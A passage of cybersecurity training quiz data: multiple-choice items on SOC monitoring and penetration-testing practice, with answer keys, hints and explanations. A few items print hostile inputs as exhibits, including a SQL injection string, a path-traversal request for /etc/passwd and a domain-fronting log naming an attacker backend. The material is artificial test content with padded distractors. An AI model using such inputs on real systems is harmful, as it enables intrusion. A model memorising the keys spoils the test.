    options: ["Count open ports, and revisit the decision after the next release","Check CPU load only, and review the outcome at the next monthly meeting","Monitor bpf syscall use and loaded programs against a baseline","Review disk space, and revisit the decision after the next release"],
    correct: 2, why: "eBPF can hide processes and traffic, so loaded programs and loader activity need monitoring.",
    hint: "Watch bpf()."
  },
  {
    id: 187, rank: 4, role: "soc", topic: "Phishing-Resistant MFA Telemetry", difficulty: "EXPERT",
    q: "After deploying FIDO2, which log signal still suggests a bypass attempt?",
    options: ["A password change","Successful passkey sign-ins, in most cases","Sign-ins that fall back to weaker methods","Device registration by the owner during an approved onboarding session at the helpdesk"],
    correct: 2, why: "Attackers target fallback paths when strong methods are enforced.",
    hint: "Fallbacks."
  },
  {
    id: 188, rank: 4, role: "soc", topic: "SOC Cost Modelling", difficulty: "EXPERT",
    q: "Which approach best justifies SOC investment to the board?",
    options: ["Show the number of tools","Link detection and response times to expected loss reduction","Count alerts, and review the outcome at the next monthly meeting","List staff names, and revisit the decision after the next release"],
    correct: 1, why: "Executives fund risk reduction, so outcomes should map to loss exposure.",
    hint: "Risk reduction."
  },
  {
    id: 189, rank: 4, role: "soc", topic: "Cross-Border Evidence", difficulty: "EXPERT",
    q: "Logs needed for an investigation are stored in another jurisdiction. What should the SOC do?",
    options: ["Involve legal early to follow lawful transfer and access rules","Copy everything immediately","Delete local copies, and review the outcome at the next monthly meeting","Ask the cloud vendor informally, then record the result in the ticket"],
    correct: 0, why: "Data transfer and access laws affect evidence handling and admissibility.",
    hint: "Legal first."
  },
  {
    id: 190, rank: 4, role: "soc", topic: "Command and Control over SaaS", difficulty: "EXPERT",
    q: "Malware uses a legitimate collaboration service for command and control. What is the BEST detection approach?",
    options: ["Ignore trusted services, and review the outcome at the next monthly meeting","Block the whole service, and review the outcome at the next monthly meeting","Detect unusual API use, automation patterns and tenant identifiers by host","Look only at IP reputation"],
    correct: 2, why: "Blocking the service is the runner-up since it removes the channel, but it breaks business use and attackers switch services.",
    hint: "Behaviour in trusted services."
  },
  {
    id: 191, rank: 4, role: "soc", topic: "Memory Analysis Priorities", difficulty: "EXPERT",
    q: "A memory image of a server shows injected code in a signed process. What is the best next step?",
    options: ["Dump the injected region and extract strings, imports and network artefacts, as a general rule","Reboot","Assume it is benign","Delete the image"],
    correct: 0, why: "Dumping injected memory reveals the payload and indicators.",
    hint: "Extract the payload."
  },
  {
    id: 192, rank: 4, role: "soc", topic: "Purple Team Metrics", difficulty: "EXPERT",
    q: "Which metric best shows a purple programme improves detection?",
    options: ["Length of tests","Reduced time to detect across repeated techniques","Number of reports","Number of meetings"],
    correct: 1, why: "Repeating techniques and measuring detection speed shows real improvement.",
    hint: "Repeat and measure."
  },
  {
    id: 193, rank: 4, role: "soc", topic: "Attack Path Monitoring", difficulty: "EXPERT",
    q: "Which control best finds identity attack paths before attackers do?",
    options: ["Graph analysis of privilege relationships with remediation of shortest paths, as a general rule","Annual password reset","Banners","Password complexity"],
    correct: 0, why: "Graph tools reveal chains such as nested groups and delegation that grant domain control.",
    hint: "Map the paths."
  },
  {
    id: 194, rank: 4, role: "soc", topic: "MFA Reset Social Engineering", difficulty: "EXPERT",
    q: "Attackers call the helpdesk to enrol their own MFA device for an executive. What is the BEST control?",
    options: ["Ask security questions","Strong identity proofing with callback to a verified manager and a logged cooling period","Reset on request to avoid delays","Reset only by email"],
    correct: 1, why: "Reset by email is the runner-up since it leaves a record, but email can be compromised too.",
    hint: "Prove identity."
  },
  {
    id: 195, rank: 4, role: "soc", topic: "Mass Alert Storm", difficulty: "EXPERT",
    q: "A misconfigured rule produces 200,000 alerts and hides a real incident. What is the best structural lesson?",
    options: ["Hire more analysts","Ignore low alerts","Delete the SIEM","Add alert volume limits, circuit breakers and anomaly alerts on the alert stream, and review the outcome at the next monthly meeting"],
    correct: 3, why: "Automated protection against alert floods keeps critical signals visible.",
    hint: "Protect the queue."
  },
  {
    id: 196, rank: 4, role: "soc", topic: "Cloud Workload Compromise", difficulty: "EXPERT",
    q: "A container runs a crypto miner after an image pull. What is the best long-term control?",
    options: ["Longer passwords","Disable the cloud account until the next planned change window several weeks away","More dashboards","Image signing, scanning and runtime policy, as a general rule"],
    correct: 3, why: "Supply chain and runtime controls stop untrusted images running.",
    hint: "Trusted images."
  },
  {
    id: 197, rank: 4, role: "soc", topic: "Nation-State Persistence Review", difficulty: "EXPERT",
    q: "After eviction, an advanced actor returns within weeks. What is the BEST explanation to investigate first?",
    options: ["Bad luck","Missed persistence or stolen credentials and trust relationships","The attacker is a new group","Weak Wi-Fi"],
    correct: 1, why: "Bad luck is the runner-up in appearance only; returns usually come from persistence or credentials not rotated.",
    hint: "Look for the missed foothold."
  },
  {
    id: 198, rank: 4, role: "soc", topic: "Threat Landscape Briefing", difficulty: "EXPERT",
    q: "How should the SOC use threat intelligence in a briefing to executives?",
    options: ["Avoid specifics","Relate actors and techniques to company assets and decisions","List every indicator of compromise that the team has received from all feeds this year","Share raw logs, and revisit the decision after the next release"],
    correct: 1, why: "Executives need relevance and actions, not data volume.",
    hint: "Relevance."
  },
  {
    id: 199, rank: 4, role: "soc", topic: "Resilience Testing", difficulty: "EXPERT",
    q: "What should a ransomware tabletop for the SOC include?",
    options: ["A vendor demo","A list of tools","Only antivirus updates","Backup loss, identity compromise, communications and decision timing, as a general rule"],
    correct: 3, why: "Realistic complications reveal gaps in decisions and recovery.",
    hint: "Make it hard."
  },
  {
    id: 200, rank: 4, role: "soc", topic: "Beacon With Domain Fronting", difficulty: "EXPERT",
    exhibit: "TLS SNI: assets.popular-cdn.example\nHTTP Host: c2-backend.attacker-app.example\nJA3: 6734f37431670b3ab4292b8f60f29984\nInterval: 45s +/- 5s",
    q: "A host calls a large CDN hostname, but the TLS SNI and HTTP Host header differ. What does this most strongly suggest?",
    options: ["A normal browser caching images from the content network","An expired certificate on the intranet, as a general rule","Domain fronting used to hide the real destination","A corrupted DNS cache on the workstation, as a general rule"],
    correct: 2, why: "Different SNI and Host values let traffic appear to go to a trusted CDN while reaching an attacker-controlled backend.",
    hint: "SNI versus Host."
  },
  {
    id: 201, rank: 0, role: "pentest", topic: "Penetration Test Authorisation", difficulty: "BEGINNER",
    q: "What must a tester have before starting a penetration test of a client's systems?",
    options: ["Nothing, as long as the tester only looks and never changes anything","A verbal agreement from a friendly manager at the client","Written permission that defines scope and dates","A list of the client's passwords supplied by the helpdesk for the test"],
    correct: 2, why: "Written authorisation protects both parties legally and defines what may be tested and when.",
    hint: "Permission in writing."
  },
  {
    id: 202, rank: 0, role: "pentest", topic: "Vulnerability Scan Versus Pen Test", difficulty: "BEGINNER",
    q: "How does a penetration test differ from a vulnerability scan?",
    options: ["A pen test exploits weaknesses to show impact, a scan lists them","There is no difference as both produce the same report with the same content","A pen test is fully automatic, and a scan is always done by hand with no tools at all","A scan breaks into systems, and a pen test only reads the documentation"],
    correct: 0, why: "Scanners identify possible weaknesses; testers verify and chain them to show actual risk.",
    hint: "Exploit versus list."
  },
  {
    id: 203, rank: 0, role: "pentest", topic: "Test Window Agreement", difficulty: "BEGINNER",
    q: "Why does a test agreement include dates and a testing window?",
    options: ["So the client can plan support and avoid clashes with changes","To describe how the client will pay the invoice after the report is delivered","To give the tester the right to test at any time that the tester prefers","To list the exploits the tester is forbidden to learn about during training"],
    correct: 0, why: "A fixed window lets the client prepare contacts and avoid clashes with changes or outages.",
    hint: "When, not what."
  },
  {
    id: 204, rank: 0, role: "pentest", topic: "Passive Reconnaissance", difficulty: "BEGINNER",
    q: "Which activity is passive reconnaissance?",
    options: ["Sending probes to every open port on the company's firewall","Trying common passwords on the remote login page, wherever possible","Connecting to the file server to list its shares, and review the outcome at the next monthly meeting","Reading the company's public job adverts and website"],
    correct: 3, why: "Passive recon gathers public information without touching the target's systems.",
    hint: "Do not touch the target."
  },
  {
    id: 205, rank: 0, role: "pentest", topic: "Reading Nmap Output", difficulty: "BEGINNER",
    exhibit: "PORT     STATE  SERVICE\n22/tcp   open   ssh\n80/tcp   open   http\n3306/tcp closed mysql",
    q: "What does this Nmap result show?",
    options: ["The host appears to be down as no replies came back","All three ports are reported as filtered by the scanner","Only the web port is open, and the host is otherwise silent","Ports 22 and 80 open, 3306 closed, in most cases"],
    correct: 3, why: "State open means a service is listening; closed means reachable but nothing listening.",
    hint: "Read the state column."
  },
  {
    id: 206, rank: 0, role: "pentest", topic: "SQL Injection Basics", difficulty: "BEGINNER",
    q: "Which input in a login form is a typical SQL injection test?",
    options: ["Password123","' OR '1'='1","hello world","admin@example.com"],
    correct: 1, why: "A quote followed by an always-true condition tests whether user input alters the SQL query.",
    hint: "Break out of the quotes."
  },
  {
    id: 207, rank: 0, role: "pentest", topic: "Cross-Site Scripting Meaning", difficulty: "BEGINNER",
    q: "What is cross-site scripting (XSS)?",
    options: ["A way of copying whole websites between two servers during a migration","A firewall rule that blocks scripts from leaving the company network","A type of password hash used to store credentials in a database","Attacker script running in a victim's browser, in most cases"],
    correct: 3, why: "XSS injects script into pages viewed by others, allowing session theft or actions in their name.",
    hint: "Script in the victim's browser."
  },
  {
    id: 208, rank: 0, role: "pentest", topic: "Critical Finding During Test", difficulty: "BEGINNER",
    q: "A tester finds an unauthenticated remote code execution flaw on a production server. What is the BEST action?",
    options: ["Post the flaw on a public forum to warn other users of the same product","Keep exploiting to see how far it goes, and report at the end","Stop exploiting and notify the client contact at once","Fix the server without telling the client"],
    correct: 2, why: "Continuing to test is the runner-up since it adds detail, but a critical exposure on production should be reported at once.",
    hint: "Report critical issues immediately."
  },
  {
    id: 209, rank: 0, role: "pentest", topic: "Default Credentials", difficulty: "BEGINNER",
    q: "Why are default usernames and passwords a common finding in tests?",
    options: ["They are always too long","They cannot be used to log in to any production device","They are required by law","They are public and often left unchanged"],
    correct: 3, why: "Attackers try documented defaults on every exposed device first.",
    hint: "Documented and unchanged."
  },
  {
    id: 210, rank: 0, role: "pentest", topic: "Brute Force Risk in Testing", difficulty: "BEGINNER",
    q: "A tester wants to brute-force a login page during business hours. What is the BEST approach?",
    options: ["Check the rules and agree limits to avoid locking real users","Use real customers' accounts, and the test looks as realistic as it can be","Skip it, and report the page as secure","Run it at full speed to save time"],
    correct: 0, why: "Running at full speed is the runner-up as it gives fast results, but it can lock out real users and disrupt the service.",
    hint: "Agree the limits first."
  },
  {
    id: 211, rank: 0, role: "pentest", topic: "Hashing Versus Encryption", difficulty: "BEGINNER",
    q: "What is the main difference between hashing and encryption?",
    options: ["Encryption cannot protect data","Hashing needs a key to reverse it, and encryption does not need a key at all","Hashing is one-way, encryption is reversible with a key","They are identical in how they work"],
    correct: 2, why: "Hashes are designed not to be reversed; encryption is designed to be reversed by key holders.",
    hint: "One-way versus two-way."
  },
  {
    id: 212, rank: 0, role: "pentest", topic: "Password Salting", difficulty: "BEGINNER",
    q: "Why are salts added to password hashes?",
    options: ["So the stored password becomes shorter, and takes less space in the database","So identical passwords give different hashes, in most cases","So the user can see it","So the hash can be decrypted again by the administrator when a user forgets"],
    correct: 1, why: "Unique salts stop precomputed tables and reveal less about duplicate passwords.",
    hint: "Make hashes unique."
  },
  {
    id: 213, rank: 0, role: "pentest", topic: "Burp Suite Purpose", difficulty: "BEGINNER",
    q: "What is Burp Suite mainly used for?",
    options: ["Monitoring staff attendance, until the next scheduled review takes place","Backing up databases, and revisit the decision after the next release","Encrypting laptop disks, and revisit the decision after the next release","Intercepting and modifying web traffic to test applications"],
    correct: 3, why: "Burp acts as a proxy between browser and server so a tester can inspect and alter requests.",
    hint: "Web proxy."
  },
  {
    id: 214, rank: 0, role: "pentest", topic: "Black Box Meaning", difficulty: "BEGINNER",
    q: "What does a black box test mean?",
    options: ["The test is done at night","The tester has no prior knowledge of the target","The test uses only physical tools","The tester is given full source code access, and design documents from the start"],
    correct: 1, why: "Black box simulates an outsider with no inside information; white box gives full knowledge.",
    hint: "No knowledge."
  },
  {
    id: 215, rank: 0, role: "pentest", topic: "HTTP Request Reading", difficulty: "BEGINNER",
    exhibit: "GET /download?file=../../../../etc/passwd HTTP/1.1\nHost: shop.example\nUser-Agent: curl/8.4.0",
    q: "What does this request show an attacker trying to do?",
    options: ["Log in with a valid user, and review the outcome at the next monthly meeting","Reset a password","Read a file outside the web folder with path traversal, as a general rule","Upload a picture"],
    correct: 2, why: "Repeated ../ sequences try to climb out of the web root to reach system files.",
    hint: "Dot dot slash."
  },
  {
    id: 216, rank: 0, role: "pentest", topic: "Exploit and Vulnerability", difficulty: "BEGINNER",
    q: "What is the relationship between a vulnerability and an exploit?",
    options: ["They are unrelated","A vulnerability is a type of firewall","An exploit is code or a method that takes advantage of a vulnerability","An exploit is a patch"],
    correct: 2, why: "A vulnerability is the weakness, and the exploit is how it is abused.",
    hint: "Weakness versus method."
  },
  {
    id: 217, rank: 0, role: "pentest", topic: "CVSS Purpose", difficulty: "BEGINNER",
    q: "What is a CVSS score used for?",
    options: ["Counting the staff in a security team, until the next scheduled review takes place","Measuring network speed, until the next scheduled review takes place","Rating how severe a vulnerability is in a standard way","Checking if a password is strong"],
    correct: 2, why: "CVSS gives a common severity score, though real priority also depends on context.",
    hint: "Severity score."
  },
  {
    id: 218, rank: 0, role: "pentest", topic: "Social Engineering Test Limits", difficulty: "BEGINNER",
    q: "A client asks for a phishing test. What is the BEST way to avoid harm?",
    options: ["Collect real passwords, and store them","Agree scope and approved lists, and avoid sensitive topics like layoffs or health","Use a message about a family emergency, and revisit the decision after the next release","Send it to everyone including their families, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Collecting real passwords is the runner-up because it measures success, but it creates data risk; recording clicks is enough.",
    hint: "Avoid harm and real credentials."
  },
  {
    id: 219, rank: 0, role: "pentest", topic: "Packet Capture Tool", difficulty: "BEGINNER",
    q: "Which tool is commonly used to capture and inspect network packets?",
    options: ["Notepad, as a general rule","Wireshark","Excel, as a general rule","Photoshop, in most cases"],
    correct: 1, why: "Wireshark lets testers and defenders examine traffic in detail.",
    hint: "Packet analyser."
  },
  {
    id: 220, rank: 0, role: "pentest", topic: "Report Value", difficulty: "BEGINNER",
    q: "What makes a penetration test report most useful to a client?",
    options: ["Technical jargon with no summary","Only a list of tools used","Only screenshots without text","Clear findings with evidence, risk rating and remediation steps, as a general rule"],
    correct: 3, why: "Reports must let both managers and technical staff understand and fix the issues.",
    hint: "Findings and fixes."
  },
  {
    id: 221, rank: 0, role: "pentest", topic: "Backups Before Testing", difficulty: "BEGINNER",
    q: "A tester is about to run an intrusive test on a production database. What should the client do first? Choose the BEST action.",
    options: ["Confirm a recent tested backup and agree a rollback plan","Disable monitoring, and revisit the decision after the next release","Tell nobody, and revisit the decision after the next release","Hand over the root password"],
    correct: 0, why: "Disabling monitoring is the runner-up as it avoids false alarms, but it removes protection and hides tester activity from the SOC.",
    hint: "Prepare for rollback."
  },
  {
    id: 222, rank: 0, role: "pentest", topic: "Directory Enumeration", difficulty: "BEGINNER",
    q: "What is the goal of directory enumeration against a web server?",
    options: ["Encrypting the website, and revisit the decision after the next release","Speeding up the website, until the next scheduled review takes place","Finding hidden folders and files that are not linked from the site","Changing DNS records"],
    correct: 2, why: "Enumeration reveals admin pages, backups and test files that may expose data.",
    hint: "Find the hidden."
  },
  {
    id: 223, rank: 0, role: "pentest", topic: "Banner Grabbing", difficulty: "BEGINNER",
    q: "What does banner grabbing reveal?",
    options: ["The staff list","The physical address of the server, as a general rule","The password of the administrator, in most cases","The software name and version a service reports"],
    correct: 3, why: "Version information helps testers look for known vulnerabilities.",
    hint: "Service identity."
  },
  {
    id: 224, rank: 0, role: "pentest", topic: "SSH Key Handling", difficulty: "BEGINNER",
    q: "What is the safest way to handle a private SSH key?",
    options: ["Store it on a public website, and revisit the decision after the next release","Keep it private with a passphrase, and never share it, as a first step","Post it in chat","Email it to the team"],
    correct: 1, why: "A private key proves identity, so exposure lets anyone log in as the owner.",
    hint: "Private means private."
  },
  {
    id: 225, rank: 0, role: "pentest", topic: "Wireless Test Basics", difficulty: "BEGINNER",
    q: "Which Wi-Fi security setting is the weakest?",
    options: ["Open network with no encryption","WPA2 with a long passphrase","Enterprise authentication with certificates","WPA3"],
    correct: 0, why: "Open networks expose traffic to anyone nearby and offer no authentication.",
    hint: "No encryption."
  },
  {
    id: 226, rank: 0, role: "pentest", topic: "Privilege Escalation Meaning", difficulty: "BEGINNER",
    q: "What is privilege escalation?",
    options: ["Gaining higher access rights than first obtained","Installing a printer","Moving to a new desk, and revisit the decision after the next release","Increasing the speed of a network, as soon as practical"],
    correct: 0, why: "Testers move from a normal user to admin or root to show the impact of a flaw.",
    hint: "Higher rights."
  },
  {
    id: 227, rank: 0, role: "pentest", topic: "Cookie Security Flags", difficulty: "BEGINNER",
    q: "Which cookie flag helps stop scripts from reading a session cookie?",
    options: ["HttpOnly","Colour, as a general rule","SameName, as a general rule","Visible, in most cases"],
    correct: 0, why: "HttpOnly makes the cookie inaccessible to JavaScript, limiting theft through XSS.",
    hint: "Hide from scripts."
  },
  {
    id: 228, rank: 0, role: "pentest", topic: "Scoping IP Ranges", difficulty: "BEGINNER",
    q: "The client lists 10.0.0.0/24 in scope. During a scan the tester finds an interesting host at 10.0.1.15. What is the BEST action?",
    options: ["Ignore it silently, until the next scheduled review takes place","Do not test it and ask the client whether it should be added","Test it as it is probably part of the same company","Scan it lightly first, and revisit the decision after the next release"],
    correct: 1, why: "Scanning lightly is the runner-up because it seems harmless, but it is still testing an out-of-scope system without permission.",
    hint: "Ask first."
  },
  {
    id: 229, rank: 0, role: "pentest", topic: "File Permission Finding", difficulty: "BEGINNER",
    exhibit: "-rw-r--r-- 1 root root 412 Mar  2 09:11 /opt/app/db_password.txt",
    q: "A Linux file containing passwords is readable by every user. What is the finding?",
    options: ["A network fault","A firewall rule","Insecure permissions exposing sensitive data, in most cases","A normal setting"],
    correct: 2, why: "World-readable credentials let any local user steal them.",
    hint: "Too open."
  },
  {
    id: 230, rank: 0, role: "pentest", topic: "Google Dorking", difficulty: "BEGINNER",
    q: "What is Google dorking in recon?",
    options: ["Hacking Google, and review the outcome at the next monthly meeting","Changing a website's colour, then record the result in the ticket","Using advanced search operators to find exposed information","Buying advertising, until the next scheduled review takes place"],
    correct: 2, why: "Operators like filetype and site can reveal documents and pages not meant to be public.",
    hint: "Advanced search."
  },
  {
    id: 231, rank: 0, role: "pentest", topic: "Egress Filtering Purpose", difficulty: "BEGINNER",
    q: "Why do defenders restrict outbound connections from servers?",
    options: ["To hide the servers from DNS","To print documents faster","To make backups run quicker","To stop compromised servers calling out to attacker systems, as a general rule"],
    correct: 3, why: "Restricting outbound traffic limits command channels and data leaving after a compromise.",
    hint: "Limit calling out."
  },
  {
    id: 232, rank: 0, role: "pentest", topic: "Sensitive Data in Test", difficulty: "BEGINNER",
    q: "A tester finds a database with customer card numbers. What should they do?",
    options: ["Share it with friends, and revisit the decision after the next release","Download everything as proof","Sell the data","Avoid copying real data and report the exposure with minimal proof"],
    correct: 3, why: "Testers should prove access without taking more data than necessary.",
    hint: "Minimal proof."
  },
  {
    id: 233, rank: 0, role: "pentest", topic: "Retesting", difficulty: "BEGINNER",
    q: "Why does a client usually ask for a retest after fixing findings?",
    options: ["To delete the report","To pay more money","To change the scope","To confirm the fixes work and did not create new problems"],
    correct: 3, why: "Verification closes the loop on remediation.",
    hint: "Confirm fixes."
  },
  {
    id: 234, rank: 0, role: "pentest", topic: "Packet Sniffing Risk", difficulty: "BEGINNER",
    q: "Why is sniffing traffic on an open Wi-Fi network a risk to users?",
    options: ["Unencrypted data can be read by others nearby","It speeds up the network","It makes the signal stronger","It deletes the traffic"],
    correct: 0, why: "Without encryption, passwords and sessions may be exposed.",
    hint: "Others can read it."
  },
  {
    id: 235, rank: 0, role: "pentest", topic: "HTTPS Purpose", difficulty: "BEGINNER",
    q: "What does HTTPS provide that HTTP does not?",
    options: ["More colours","Faster pages","Encryption and server authentication of the connection, as a general rule","Larger files"],
    correct: 2, why: "TLS protects data in transit and helps verify the site.",
    hint: "Protects in transit."
  },
  {
    id: 236, rank: 0, role: "pentest", topic: "Cleanup After Testing", difficulty: "BEGINNER",
    q: "A tester created temporary accounts and uploaded tools during the test. What is the BEST action at the end?",
    options: ["Remove everything created and document what was changed","Rename them","Tell nobody, until the next scheduled review takes place","Leave them for the next test, and revisit the decision after the next release"],
    correct: 0, why: "Leaving them is the runner-up since it may save time later, but leftover tools and accounts create real risk for the client.",
    hint: "Clean up and document."
  },
  {
    id: 237, rank: 0, role: "pentest", topic: "Open Port Meaning", difficulty: "BEGINNER",
    q: "What does an open port show?",
    options: ["A service is accepting connections on that port","The computer is switched off","The network cable is unplugged","A password has been changed"],
    correct: 0, why: "Open ports are potential entry points that testers examine further.",
    hint: "Listening service."
  },
  {
    id: 238, rank: 0, role: "pentest", topic: "Whois Lookup", difficulty: "BEGINNER",
    q: "What information can a whois lookup provide about a domain?",
    options: ["The employees' home addresses, as a general rule","Registrar, registration dates and name servers","The CEO's password","The server's source code"],
    correct: 1, why: "Whois is public registration data used in passive recon.",
    hint: "Registration data."
  },
  {
    id: 239, rank: 0, role: "pentest", topic: "Social Engineering Pretext", difficulty: "BEGINNER",
    q: "What is a pretext in social engineering?",
    options: ["A type of firewall","A believable story used to gain trust or information, in most cases","A virus signature","A password hash"],
    correct: 1, why: "Pretexting uses invented scenarios such as a fake helpdesk call.",
    hint: "Invented story."
  },
  {
    id: 240, rank: 0, role: "pentest", topic: "Test Evidence Handling", difficulty: "BEGINNER",
    q: "How should test evidence such as screenshots and logs be stored?",
    options: ["On a public share","Encrypted with access limited to the test team, and deleted per agreement, in most cases","In personal email","On any USB stick"],
    correct: 1, why: "Evidence often contains sensitive client data and must be protected.",
    hint: "Protect evidence."
  },
  {
    id: 241, rank: 1, role: "pentest", topic: "Scope Document Review", difficulty: "INTERMEDIATE",
    q: "Which item is most important to confirm in a written scope before testing starts?",
    options: ["The colour theme used in the final report","The favourite tools of the testing team members who will do the work","The number of pages that the final report is expected to contain overall","The systems, and dates authorised for testing, in most cases"],
    correct: 3, why: "Written authorisation of targets and timing protects both the client and the testers.",
    hint: "Authorisation."
  },
  {
    id: 242, rank: 1, role: "pentest", topic: "Rules of Engagement", difficulty: "INTERMEDIATE",
    q: "Testers find a system outside the agreed scope that looks poorly protected. What is the BEST action?",
    options: ["Test it quietly, and mention it only in the final report, in the first instance","Stop, record it and ask the client for written approval first, in most cases","Test it anyway as it could improve the client's security, in the first instance","Ignore it, and never tell the client that it exists, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Testing it anyway is the runner-up as it seems helpful, but acting outside scope can be unlawful and breach the contract.",
    hint: "Out of scope."
  },
  {
    id: 243, rank: 1, role: "pentest", topic: "Vulnerability Scan Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Host: 10.20.4.15   Port: 443/tcp\nFinding: TLS certificate expired (Severity: Medium)\nPlugin: 51192   Confidence: Tentative\nBanner: shared load balancer in front of three hosts",
    q: "What should the analyst do first with this scan result?",
    options: ["Check whether the finding is a false positive on that host","Delete it as it is marked informational","Report it as confirmed without any further checking, then record the result in the ticket","Send it to the client unreviewed"],
    correct: 0, why: "Scanner results need validation before they are reported as confirmed.",
    hint: "Validate first."
  },
  {
    id: 244, rank: 1, role: "pentest", topic: "Risk Rating Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Finding: Outdated web framework with a known remote code execution advisory\nAsset: customer-portal (internet-facing)\nData: names, addresses, payment tokens\nCompensating controls: none observed\nCVSS base: 9.8",
    q: "Which factor best explains why this finding is rated Critical?",
    options: ["The system has a long hostname that is hard to read","The tester used a new tool to detect the issue, in most cases","An internet-facing system holds regulated customer data","The report has the findings in alphabetical order"],
    correct: 2, why: "Rating combines exposure and impact on the asset and its data.",
    hint: "Exposure and impact."
  },
  {
    id: 245, rank: 1, role: "pentest", topic: "Executive Summary Writing", difficulty: "INTERMEDIATE",
    q: "Which is the BEST content for the executive summary of a test report?",
    options: ["The personal opinions of the tester about the client staff, in most cases","Only the names of the tools the tester ran during the work, as a general rule","A full list of every packet, and command the tester used, as a general rule","Business impact, overall risk level and the top priorities to fix"],
    correct: 3, why: "A command list is the runner-up as it shows effort, but executives need impact and priorities to decide.",
    hint: "Business language."
  },
  {
    id: 246, rank: 1, role: "pentest", topic: "Remediation Advice", difficulty: "INTERMEDIATE",
    q: "Which remediation recommendation is the most useful to a development team?",
    options: ["Use parameterised queries, and validate input on the server, as a first step","Fix the application, and it is more secure in general","Consider hiring a more experienced developer next year","Be careful when writing code in the future from now on"],
    correct: 0, why: "Specific actionable advice helps developers fix the root cause.",
    hint: "Be specific."
  },
  {
    id: 247, rank: 1, role: "pentest", topic: "Retest Planning", difficulty: "INTERMEDIATE",
    q: "Why should a retest be scheduled after the client fixes findings?",
    options: ["To confirm the fixes work and caused no new issues, in most cases","To replace the original report with a much shorter version for the board","To avoid speaking to the client about the results, as a general rule","To raise the invoice for the client once the original work is finished"],
    correct: 0, why: "Verification closes the loop on remediation.",
    hint: "Verify the fix."
  },
  {
    id: 248, rank: 1, role: "pentest", topic: "Evidence Handling", difficulty: "INTERMEDIATE",
    q: "How should a tester store screenshots and logs that contain client data?",
    options: ["A shared personal drive that friends and family members can open at any time","An email sent to every member of the testing company for easier access to it","On a public repository, and the team can find it","Encrypted storage limited to the team and deleted per contract"],
    correct: 3, why: "Client evidence is sensitive and must be protected and disposed of properly.",
    hint: "Protect evidence."
  },
  {
    id: 249, rank: 1, role: "pentest", topic: "False Positive Triage", difficulty: "INTERMEDIATE",
    q: "A scanner reports a vulnerable version, but the vendor patched it without changing the banner. What is this?",
    options: ["A problem with the colour of the report, in most cases","A likely false positive caused by a backported fix","A new type of attack technique that was found","A confirmed critical flaw that needs urgent work, as a general rule"],
    correct: 1, why: "Banner-based detection can miss backported patches.",
    hint: "Backport."
  },
  {
    id: 250, rank: 1, role: "pentest", topic: "Authenticated vs Unauthenticated", difficulty: "INTERMEDIATE",
    q: "What is the main advantage of an authenticated vulnerability scan?",
    options: ["It never produces any false positives at all","It sees configuration and patch details that outsiders cannot","It removes the need for a scope document","It is always faster than every other scanning type"],
    correct: 1, why: "Credentials let the scanner inspect the host from inside.",
    hint: "Inside view."
  },
  {
    id: 251, rank: 1, role: "pentest", topic: "Test Type Selection", difficulty: "INTERMEDIATE",
    q: "A client wants to know how well their team detects and responds to attacks. Which engagement fits BEST?",
    options: ["A code style review that the developers carry out among themselves alone","A vulnerability scan that is run once, and reported without any review","A policy review done without any technical activity","A red team exercise against a defending blue team"],
    correct: 3, why: "A scan is the runner-up as it is cheap, but it does not exercise detection and response.",
    hint: "Detection and response."
  },
  {
    id: 252, rank: 1, role: "pentest", topic: "Reporting Severity Disagreement", difficulty: "INTERMEDIATE",
    q: "The client disagrees with a High rating because the system is internal. What is the best response?",
    options: ["Discuss the rating criteria and adjust only if the evidence supports it, as a general rule","Remove the finding from the report to keep the client happy, then record the result in the ticket","Raise it to Critical to prove the tester was correct","Refuse to discuss it, and send the same report again, until the next scheduled review takes place"],
    correct: 0, why: "Ratings should follow documented criteria and evidence.",
    hint: "Criteria."
  },
  {
    id: 253, rank: 1, role: "pentest", topic: "Asset Inventory Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Client inventory: 120 hosts\nDiscovery scan: 147 live hosts\nNot in inventory: 27 (14 web servers, 9 printers, 4 unknown)\nOwner of unknown hosts: none recorded",
    q: "What does this inventory comparison suggest about the client's environment?",
    options: ["All hosts are fully patched","Unmanaged systems exist that the client did not list, in most cases","The scan was run against the wrong year","Every host was listed correctly by the client"],
    correct: 1, why: "Hosts found by discovery but missing from the inventory indicate shadow assets.",
    hint: "Compare the lists."
  },
  {
    id: 254, rank: 1, role: "pentest", topic: "Compliance vs Security", difficulty: "INTERMEDIATE",
    q: "Why can a passed compliance audit still leave real security gaps?",
    options: ["Audits always check every system every day without gaps","Compliance means no attacker can ever succeed","Audits sample controls at a point in time and not every risk","Compliance forbids any security testing from taking place, as a general rule"],
    correct: 2, why: "Compliance is a baseline and not a guarantee.",
    hint: "Point in time."
  },
  {
    id: 255, rank: 1, role: "pentest", topic: "Social Engineering Scoping", difficulty: "INTERMEDIATE",
    q: "What must be agreed before any phishing awareness exercise begins?",
    options: ["A plan to hide the exercise from the legal team, as a general rule","A promise to punish anyone who clicks a link in it, as a general rule","The names of staff members to embarrass in the report, in most cases","Approval, targets, stop conditions and how results are handled"],
    correct: 3, why: "Such exercises need executive approval and clear handling of individuals' data.",
    hint: "Approval and handling."
  },
  {
    id: 256, rank: 1, role: "pentest", topic: "Report Finding Structure", difficulty: "INTERMEDIATE",
    q: "Which set of fields makes a finding most actionable?",
    options: ["Title only with a single word summary of the issue","Only the tool name, and the date of the test","Only a screenshot with no text around it","Title, affected asset, description, impact, evidence and fix"],
    correct: 3, why: "A complete structure lets the reader understand and fix it.",
    hint: "Complete structure."
  },
  {
    id: 257, rank: 1, role: "pentest", topic: "Patch Prioritisation Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "A: web-gw-01  internet-facing  CVE-2025-0001 CVSS 9.1  exploited in the wild: yes\nB: test-app-04 internal  CVE-2024-1234 CVSS 3.1  exploited: no\nC: printer-12  internal  banner disclosure  info\nD: old-fs-02   powered off  CVE-2023-4321 CVSS 7.5",
    q: "Which patch should the client deploy first according to this list?",
    options: ["The archived server that is switched off","The printer with an informational banner finding, in most cases","The test server with a low severity cosmetic issue","The internet-facing server with an actively exploited flaw"],
    correct: 3, why: "Exposure plus active exploitation should drive priority.",
    hint: "Exposure and exploitation."
  },
  {
    id: 258, rank: 1, role: "pentest", topic: "Penetration Test Limitations", difficulty: "INTERMEDIATE",
    q: "Which statement about a penetration test is accurate?",
